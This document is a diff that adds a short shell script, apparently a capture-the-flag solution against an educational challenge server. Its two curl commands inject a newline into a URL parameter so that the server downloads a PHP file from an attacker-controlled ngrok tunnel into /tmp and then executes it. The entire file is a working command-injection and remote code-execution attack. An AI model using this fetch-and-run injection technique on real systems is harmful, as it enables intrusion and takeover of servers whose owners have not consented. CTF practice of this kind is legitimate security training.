@@ -1,0 +1,6 @@
+# First, execute ngrok to obtain URL that redirects to localhost
+# Then, change the URL here and in the [response] file
+# Always execute the command in [server] file before executing each of the following commands
+
+curl -k "https://edu-ctf.csie.org:10153/?me0w=%0Awget%20http://xxx.ngrok.io%20-O%20/tmp/nono.php"
+curl -k "https://edu-ctf.csie.org:10153/?me0w=%0Aphp%20/tmp/nono.php"
